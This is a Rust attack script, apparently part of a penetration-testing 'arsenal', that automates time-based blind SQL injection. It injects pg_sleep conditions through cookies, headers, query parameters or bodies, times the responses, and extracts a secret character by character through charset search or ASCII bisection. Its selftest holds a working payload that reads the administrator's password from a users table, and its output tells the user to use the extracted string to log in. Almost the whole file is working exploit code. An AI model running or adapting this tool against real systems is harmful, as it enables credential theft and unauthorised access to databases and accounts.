#!/usr/bin/env rust-script
//! name: time_oracle
//! description: 时间型布尔 oracle 提取件(盲注时间延迟腿)- 用同一个注入模板逐请求发送并测单次响应耗时,以「耗时 >= 阈值」为真值读布尔;两种读法:charset 逐字符命中,或 bisect 对 ASCII 码做二分;另给 eval 多载荷定点判定(真/假对照)。一个信封给出基线耗时、每步耗时轨迹、抽出串与抽样复核。合法授权测试用途。
//! version: 1.0.0
//! args: <url> --template 'FULL-VALUE with {I} {C} {S}' [--place cookie:TrackingId] [--sleep 3] [--threshold-secs 2.0] [--bisect 32-126] [--charset S] [--max N] [--eval 'FULL-VALUE with {S}']... [--method GET] [--jar PATH] [--extra-header 'K: V'] [--threads N] [--timeout-ms N] [--selftest]
//! keywords: 漏洞猎手套件, 武器库, 渗透测试, blind, sqli, time-based, delay, oracle, pg_sleep, extract
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! url = "2"
//! ```
use pi_rust_lib::serde_json::{self, json, Value};
use std::collections::BTreeMap;
use std::sync::mpsc;
use std::time::{Duration, Instant};
use url::Url;

type Jar = BTreeMap<String, BTreeMap<String, String>>;

struct Cfg {
    url: String,
    template: String,
    place: String,
    method: String,
    sleep: u32,
    threshold_ms: u128,
    max: usize,
    charset: Vec<char>,
    bisect: Option<(u32, u32)>,
    jar: Jar,
    headers: Vec<(String, String)>,
    threads: usize,
    timeout_s: u64,
    evals: Vec<String>,
    confirm: bool,
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        url: String::new(),
        template: String::new(),
        place: "cookie:TrackingId".to_string(),
        method: "GET".to_string(),
        sleep: 3,
        threshold_ms: 0,
        max: 32,
        charset: Vec::new(),
        bisect: None,
        jar: BTreeMap::new(),
        headers: Vec::new(),
        threads: 1,
        timeout_s: 0,
        evals: Vec::new(),
        confirm: true,
    };
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--template" => { i += 1; cfg.template = arg(&args, i); }
            "--place" => { i += 1; cfg.place = arg(&args, i); }
            "--method" => { i += 1; cfg.method = arg(&args, i).to_uppercase(); }
            "--sleep" => { i += 1; cfg.sleep = arg(&args, i).parse().unwrap_or(3); }
            "--threshold-secs" => { i += 1; cfg.threshold_ms = (arg(&args, i).parse::<f64>().unwrap_or(0.0) * 1000.0) as u128; }
            "--max" => { i += 1; cfg.max = arg(&args, i).parse().unwrap_or(32); }
            "--charset" => { i += 1; cfg.charset = arg(&args, i).chars().collect(); }
            "--bisect" => {
                i += 1;
                let s = arg(&args, i);
                if let Some((a, b)) = s.split_once('-') {
                    cfg.bisect = Some((a.trim().parse().unwrap_or(32), b.trim().parse().unwrap_or(126)));
                }
            }
            "--threads" => { i += 1; cfg.threads = arg(&args, i).parse().unwrap_or(1).max(1); }
            "--timeout-ms" => { i += 1; cfg.timeout_s = arg(&args, i).parse::<u64>().unwrap_or(0) / 1000; }
            "--eval" => { i += 1; cfg.evals.push(arg(&args, i)); }
            "--no-confirm" => { cfg.confirm = false; }
            "--extra-header" => {
                i += 1;
                let kv = arg(&args, i);
                if let Some((k, v)) = kv.split_once(':') {
                    cfg.headers.push((k.trim().to_string(), v.trim().to_string()));
                }
            }
            "--jar" => { i += 1; cfg.jar = load_jar(&arg(&args, i)); }
            other if !other.starts_with("--") && cfg.url.is_empty() => cfg.url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if cfg.charset.is_empty() {
        cfg.charset = "abcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
    }
    if cfg.threshold_ms == 0 {
        // A true answer sleeps `sleep` seconds; the false branch returns in
        // ~0.05-0.3s. 60% of the sleep is far above jitter and far below the
        // true leg, so a slow false response cannot fake a hit.
        cfg.threshold_ms = (cfg.sleep as u128) * 600;
    }
    if cfg.timeout_s == 0 {
        cfg.timeout_s = cfg.sleep as u64 + 15;
    }
    if cfg.url.is_empty() || (cfg.template.is_empty() && cfg.evals.is_empty()) {
        pi_rust_lib::report::failure(
            "time_oracle",
            "missing url/--template (or --eval)",
            "usage: time_oracle <url> --template 'xyz'||(SELECT CASE WHEN (...{I}...{C}) THEN pg_sleep({S}) ELSE pg_sleep(0) END)--' --place cookie:TrackingId --bisect 32-126",
        );
        std::process::exit(2);
    }

    let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(cfg.timeout_s)).build();
    let cookie_base = cookie_header(&cfg.jar, &cfg.url);
    let mut requests = 0usize;

    // Fixed-point evals first: caller-supplied payloads (true/false controls,
    // length probes, substring tests) each get one measured request.
    let mut evals: Vec<Value> = Vec::new();
    for e in cfg.evals.clone() {
        let value = subst(&e, &cfg, "");
        let (ms, hit) = send_timed(&agent, &cfg, &value, &cookie_base);
        requests += 1;
        evals.push(json!({"value": value, "elapsed_ms": ms, "true": hit}));
    }

    let mut positions: Vec<Value> = Vec::new();
    let mut extracted = String::new();
    let mut modes: Vec<&str> = Vec::new();
    if cfg.template.is_empty() {
        let data = json!({
            "url": cfg.url, "place": cfg.place, "sleep_secs": cfg.sleep,
            "threshold_ms": cfg.threshold_ms, "requests": requests, "evals": evals,
        });
        pi_rust_lib::report::success("time_oracle", data, "read each eval's elapsed_ms against threshold_ms; add --template to extract a string").expect("report");
        return;
    }

    if let Some((lo, hi)) = cfg.bisect {
        modes.push("bisect");
        // Bisect reads the character code: the template's condition must be
        // `code > {C}`. The first value whose answer is false is the code.
        for pos in 1..=cfg.max {
            let mut attempt = 0;
            let found = loop {
                attempt += 1;
                let mut l = lo;
                let mut r = hi + 1;
                let mut trace: Vec<Value> = Vec::new();
                while l < r {
                    let mid = l + (r - l) / 2;
                    let value = cfg.template.replace("{I}", &pos.to_string()).replace("{C}", &mid.to_string()).replace("{S}", &cfg.sleep.to_string());
                    let (ms, hit) = send_timed(&agent, &cfg, &value, &cookie_base);
                    requests += 1;
                    trace.push(json!({"c": mid, "ms": ms, "true": hit}));
                    if hit { l = mid + 1; } else { r = mid; }
                }
                let code = l;
                // Two-sided verification: code must fail the `>` test and
                // code-1 must pass it. Retry the position when the pair is
                // inconsistent (a transient slow false leg would show up here).
                if !cfg.confirm || code > hi {
                    break Some((code, trace, attempt));
                }
                let v_code = cfg.template.replace("{I}", &pos.to_string()).replace("{C}", &code.to_string()).replace("{S}", &cfg.sleep.to_string());
                let (ms_code, hit_code) = send_timed(&agent, &cfg, &v_code, &cookie_base);
                requests += 1;
                let v_prev = cfg.template.replace("{I}", &pos.to_string()).replace("{C}", &(code - 1).to_string()).replace("{S}", &cfg.sleep.to_string());
                let (ms_prev, hit_prev) = send_timed(&agent, &cfg, &v_prev, &cookie_base);
                requests += 1;
                trace.push(json!({"verify_code": code, "ms": ms_code, "true": hit_code}));
                trace.push(json!({"verify_code": code - 1, "ms": ms_prev, "true": hit_prev}));
                if !hit_code && hit_prev {
                    break Some((code, trace, attempt));
                }
                if attempt >= 3 {
                    break None;
                }
            };
            match found {
                Some((code, trace, attempt)) => {
                    let ch = char::from_u32(code).unwrap_or('?');
                    positions.push(json!({"i": pos, "code": code, "char": ch.to_string(), "attempts": attempt, "trace": trace}));
                    extracted.push(ch);
                }
                None => break,
            }
        }
    } else {
        modes.push("charset");
        for pos in 1..=cfg.max {
            let found = search_position(&agent.clone(), &cfg, pos, &cookie_base, &mut requests);
            match found {
                Some((ch, ms)) => {
                    positions.push(json!({"i": pos, "char": ch.to_string(), "elapsed_ms": ms}));
                    extracted.push(ch);
                }
                None => break,
            }
        }
    }

    let data = json!({
        "url": cfg.url,
        "place": cfg.place,
        "mode": modes.join("+"),
        "sleep_secs": cfg.sleep,
        "threshold_ms": cfg.threshold_ms,
        "extracted": extracted,
        "length": extracted.chars().count(),
        "requests": requests,
        "evals": evals,
        "positions": positions,
    });
    pi_rust_lib::report::success("time_oracle", data, "use the extracted string in the next step (login/delete); raise --max if it looks truncated, and re-read any position whose verify pair disagreed").expect("report");
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn subst(tpl: &str, cfg: &Cfg, c: &str) -> String {
    tpl.replace("{S}", &cfg.sleep.to_string()).replace("{C}", c)
}

/// One measured request. Returns (elapsed_ms, true-if-over-threshold).
fn send_timed(agent: &ureq::Agent, cfg: &Cfg, value: &str, cookie_base: &str) -> (u128, bool) {
    let (kind, name) = match cfg.place.split_once(':') {
        Some((k, n)) => (k, n),
        None => (cfg.place.as_str(), ""),
    };
    let mut cookie = cookie_base.to_string();
    let mut target = cfg.url.clone();
    let mut body: Option<String> = None;
    let mut extra: Vec<(String, String)> = cfg.headers.clone();
    match kind {
        "cookie" => {
            if !cookie.is_empty() {
                cookie.push_str("; ");
            }
            cookie.push_str(name);
            cookie.push('=');
            cookie.push_str(value);
        }
        "header" => extra.push((name.to_string(), value.to_string())),
        "query" => {
            if let Ok(mut u) = Url::parse(&cfg.url) {
                u.query_pairs_mut().append_pair(name, value);
                target = u.to_string();
            }
        }
        _ => body = Some(value.to_string()),
    }
    let mut req = if cfg.method == "POST" { agent.post(&target) } else { agent.get(&target) };
    if !cookie.is_empty() {
        req = req.set("Cookie", &cookie);
    }
    for (k, v) in &extra {
        req = req.set(k, v);
    }
    let start = Instant::now();
    let _ = match &body {
        Some(b) => req.set("Content-Type", "application/x-www-form-urlencoded").send_string(b),
        None => req.call(),
    };
    let ms = start.elapsed().as_millis();
    (ms, ms >= cfg.threshold_ms)
}

/// Charset mode: fire candidate groups concurrently, keep the first hit.
/// Response time is the oracle and each request is independent, so group
/// ordering does not matter; the winner's own time is what classifies it.
fn search_position(agent: &ureq::Agent, cfg: &Cfg, pos: usize, cookie_base: &str, requests: &mut usize) -> Option<(char, u128)> {
    let total = cfg.charset.len();
    let chunk = (total + cfg.threads - 1) / cfg.threads;
    let (tx, rx) = mpsc::channel::<(char, u128, bool)>();
    let mut expected = 0usize;
    for group in cfg.charset.chunks(chunk.max(1)) {
        let chars: Vec<char> = group.to_vec();
        let tx = tx.clone();
        let agent = agent.clone();
        let cfg_tpl = cfg.template.clone();
        let local = Cfg {
            url: cfg.url.clone(),
            template: cfg_tpl,
            place: cfg.place.clone(),
            method: cfg.method.clone(),
            sleep: cfg.sleep,
            threshold_ms: cfg.threshold_ms,
            max: cfg.max,
            charset: Vec::new(),
            bisect: None,
            jar: BTreeMap::new(),
            headers: cfg.headers.clone(),
            threads: 1,
            timeout_s: cfg.timeout_s,
            evals: Vec::new(),
            confirm: false,
        };
        let base = cookie_base.to_string();
        expected += chars.len();
        std::thread::spawn(move || {
            for ch in chars {
                let value = local.template.replace("{I}", &pos.to_string()).replace("{C}", &ch.to_string()).replace("{S}", &local.sleep.to_string());
                let (ms, hit) = send_timed(&agent, &local, &value, &base);
                let _ = tx.send((ch, ms, hit));
            }
        });
    }
    drop(tx);
    let mut found = None;
    let mut received = 0;
    while received < expected {
        let Ok((ch, ms, hit)) = rx.recv() else { break };
        received += 1;
        *requests += 1;
        if hit {
            found = Some((ch, ms));
            break;
        }
    }
    found
}

fn cookie_header(jar: &Jar, url: &str) -> String {
    let host = Url::parse(url).ok().and_then(|u| u.host_str().map(String::from)).unwrap_or_default();
    let mut parts = Vec::new();
    for (h, cookies) in jar {
        if host == *h || host.ends_with(&format!(".{h}")) || h.ends_with(&host) {
            for (k, v) in cookies {
                if k.eq_ignore_ascii_case("TrackingId") {
                    continue; // the payload owns this cookie
                }
                parts.push(format!("{k}={v}"));
            }
        }
    }
    parts.join("; ")
}

fn load_jar(path: &str) -> Jar {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| serde_json::from_str::<Value>(&s).ok())
        .and_then(|v| match v {
            Value::Object(hosts) => Some(
                hosts
                    .into_iter()
                    .map(|(h, c)| {
                        let map = c
                            .as_object()
                            .map(|o| o.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                            .unwrap_or_default();
                        (h, map)
                    })
                    .collect(),
            ),
            _ => None,
        })
        .unwrap_or_default()
}

fn selftest() {
    let cfg = Cfg {
        url: "https://example.test/".to_string(),
        template: "xyz'||(SELECT CASE WHEN (ascii(substring(password,{I},1))>{C}) THEN pg_sleep({S}) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--".to_string(),
        place: "cookie:TrackingId".to_string(),
        method: "GET".to_string(),
        sleep: 3,
        threshold_ms: 1800,
        max: 32,
        charset: "abc".chars().collect(),
        bisect: None,
        jar: BTreeMap::new(),
        headers: Vec::new(),
        threads: 1,
        timeout_s: 18,
        evals: Vec::new(),
        confirm: true,
    };
    let sub = subst(&cfg.template, &cfg, "97").replace("{I}", "4");
    let subst_ok = sub.contains("password,4,1))>97") && sub.contains("pg_sleep(3)");
    let base = cookie_header(&cfg.jar, &cfg.url);
    // bisect arithmetic: first false in [32,127] for code 97 must land on 97
    let mut l = 32u32;
    let mut r = 127u32;
    let code = 97u32;
    while l < r {
        let mid = l + (r - l) / 2;
        if code > mid { l = mid + 1; } else { r = mid; }
    }
    let ok = subst_ok && base.is_empty() && l == code && cfg.threshold_ms == 1800;
    let data = json!({"selftest": if ok {"ok"} else {"fail"}, "subst": sub, "bisect_found": l, "cookie_base": base});
    if ok {
        pi_rust_lib::report::success("time_oracle", data, "selftest passed; ready to run").expect("report");
    } else {
        pi_rust_lib::report::failure("time_oracle", "selftest failed", "inspect placeholder substitution and bisect arithmetic");
        std::process::exit(1);
    }
}
